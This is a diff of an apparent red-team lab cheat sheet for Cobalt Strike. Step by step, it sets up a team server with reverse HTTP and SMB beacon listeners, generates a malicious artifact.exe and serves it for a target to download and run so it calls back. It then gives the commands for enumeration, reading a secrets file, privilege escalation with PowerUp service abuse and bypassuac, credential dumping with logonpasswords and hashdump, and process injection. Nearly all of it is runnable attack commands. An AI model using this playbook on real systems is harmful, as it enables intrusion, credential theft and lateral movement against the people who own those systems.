@@ -4,13 +4,14 @@ Cobalt Strike
 cd /opt/cobaltstrike/
 ./update
 
-Team Server
+Start up team server
      ./teamserver <IP> <password> <Malleable C2 profile> <kill date for Beacons>
      The first 2 parameters are required, while the second 2 are optional.
      ./teamserver 10.10.215.21 redteam /opt/cobaltstrike-profiles/APT/etumbot.profile
      Note the SHA256 hash, send to other members of your team.
 
-Attack VM
+Login to team server
+     Open a new Terminal
      ./cobaltstrike
      Host: IP of team server
      Port: 50050
@@ -18,68 +19,95 @@ Attack VM
      Password: Shared password for the team server
      Connect
      VerifyFingerprint (compare with the SHA256 hash) > Yes
+------------------------------------------------------------------------------------------------------
 
-CobaltStrike > Listeners > Add
+Create listeners
+     Cobalt Strike > Listeners > Add
      Name: http
      Payload: windows/beacon_http/reverse_http
-     Host: <IP of team server>
+     Host: 10.10.215.21
      Port: 80
-     Save
-     Use default IP of the team server > Ok > Ok
+     Save > Ok > Ok
 
-Attacks > Packages > Windows Executable
+     Add
+     Name: smb
+     Payload: windows/beacon_smb/bind_pipe
+     Host: 10.10.215.21
+     Port: <greater than 1024>
+     Save
+------------------------------------------------------------------------------------------------------
+
+Create a malicious package
+     Attacks > Packages > Windows Executable
      Listener: http
      Output: Windows EXE
      x64: Use x64 payload (if needed)
      Generate
      /root/artifact.exe
      Save > Ok
+
+Setup a transfer mechanism
+     Open a new Terminal
+     cd /var/www/
+     mkdir demo
+     cd demo/
+     mv /root/artifact.exe .
+     python -m SimpleHTTPServer
+
+Target VM
+     Open a web browser to http://10.10.215.21:8000
+     Click artifact.exe to download.
+     Double click artifact.exe
+     You should get a callback to the team server.
 ------------------------------------------------------------------------------------------------------
 
-cd /root/
-mkdir demo
-mv artifact.exe demo/
-cd /root/demo/
-python -m SimpleHTTPServer 80
-
-Victim VM
-     Open a web browser to http://<team server IP>
-Victim VM
-     Open a web browser to http://<team server IP>
-     Click artifact.exe to download.
-     Double click artifact.exe and you should get the callback.
-
-Select the computer in the top pane.
-     Right click > Session > Note                 Lee - initial access
-     Right click > Interact
+Select the new user in the top pane > right click > Interact
      sleep 0                                      Make the Beacon interactive.
-     shell whoami /groups
+     note Lee - initial access
 
-Cobalt Strike > Listeners > Add
-     Name: smb
-     Payload: windows/beacon_smb/bind_pipe
-     Host: <IP of Team Server>
-     Port: 9876
-     Save
-
-Select the Beacon tab
+Enumerate the target
      getuid
-     shell whoami
      shell ipconfig /all
+     shell systeminfo
      ps
-     systeminfo
-     drives
-     shell net accounts
-     shell net localgroup administrators
-     shell net localgroup Administrators /domain
-     arp -a
-     shell net group "Domain Computers" /domain   List all computers joined to the domain.
-     shell net view /domain                       Find what domain you are on.
 
-     powershell import /opt/Empire/data/module_source/privesc/PowerUp.ps1
+     drives
+          shell dir E:
+          shell type E:\secrets.txt
+
+     shell net accounts
+     shell net localgroup
+     shell net localgroup Administrators
+     shell arp -a
+
+Escalate privledges
+     powershell-import /opt/PowerSploit/Privesc/PowerUp.ps1
      powerpick Invoke-AllChecks
 
+     powerpick Invoke-ServiceAbuse -Name 'crappy-serverice'
+     spawnas john Password123! smb
+     Select john in the top pane > right click > Interact
+     bypassuac http
+
+     john should now be running in a high integrity Beacon (see asterisk)
+------------------------------------------------------------------------------------------------------
+
+Dump passwords
+     logonpasswords
+     menu View > Credentials
+
+     ps
+     Look for another user logged in and copy the PID of their process.
+     inject <PID> <x86|x64> <listener>
+     inject 5678 x64 smb
+     Select the new user in the top pane > right click > Interact
+------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------
+
 Needs admin privs
+     shell net view /domain                       Find what domain you are on.
+     shell net localgroup Administrators /domain
+     shell net group "Domain Computers" /domain   List all computers joined to the domain.
      wdigest                                      See if there are any interesting credentials.
      hashdump                                     Dump the hashes.
 
